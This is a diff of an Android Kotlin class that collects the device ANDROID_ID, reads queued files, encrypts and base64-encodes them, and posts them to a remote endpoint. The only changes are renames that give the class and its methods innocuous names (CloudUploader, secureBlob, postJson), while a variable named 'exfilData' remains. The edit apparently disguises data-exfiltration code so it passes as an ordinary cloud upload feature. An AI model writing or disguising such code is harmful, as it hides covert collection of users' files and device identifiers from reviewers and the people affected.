@@ -20,7 +20,7 @@ import javax.crypto.spec.IvParameterSpec
 import javax.crypto.spec.SecretKeySpec
 
 @SuppressLint("HardwareIds")
-class DataSynchronizer(private val context: Context) {
+class CloudUploader(private val context: Context) {
     private val TAG = "DataSync"
     private val syncQueue: Queue<SyncItem> = LinkedList()
     private val handler = Handler(Looper.getMainLooper())
@@ -39,13 +39,13 @@ class DataSynchronizer(private val context: Context) {
         Settings.Secure.getString(context.contentResolver, Settings.Secure.ANDROID_ID)
     }
 
-    fun queueForSync(dataType: String, filePath: String) {
+    fun enqueueUpload(dataType: String, filePath: String) {
         synchronized(syncQueue) {
             syncQueue.add(SyncItem(dataType, filePath))
         }
     }
 
-    fun synchronizeData() {
+    fun startUploadJob() {
         if (isSyncing) return
 
         isSyncing = true
@@ -88,7 +88,7 @@ class DataSynchronizer(private val context: Context) {
                     val file = File(item.filePath)
                     if (file.exists()) {
                         val content = file.readBytes()
-                        val encrypted = encryptData(content)
+                        val encrypted = secureBlob(content)
                         val encoded = android.util.Base64.encodeToString(encrypted, android.util.Base64.DEFAULT)
 
                         dataArray.put(file.name, encoded)
@@ -108,7 +108,7 @@ class DataSynchronizer(private val context: Context) {
         SendDataTask(endpoint, request.toString()).execute()
     }
 
-    private fun encryptData(data: ByteArray): ByteArray {
+    private fun secureBlob(data: ByteArray): ByteArray {
         try {
             val iv = ByteArray(16).apply {
                 SecureRandom().nextBytes(this)
@@ -140,7 +140,7 @@ class DataSynchronizer(private val context: Context) {
         }
     }
 
-    fun sendData(dataType: String, data: String) {
+    fun postJson(dataType: String, data: String) {
         try {
             val exfilData = JSONObject().apply {
                 put("device_id", deviceId)
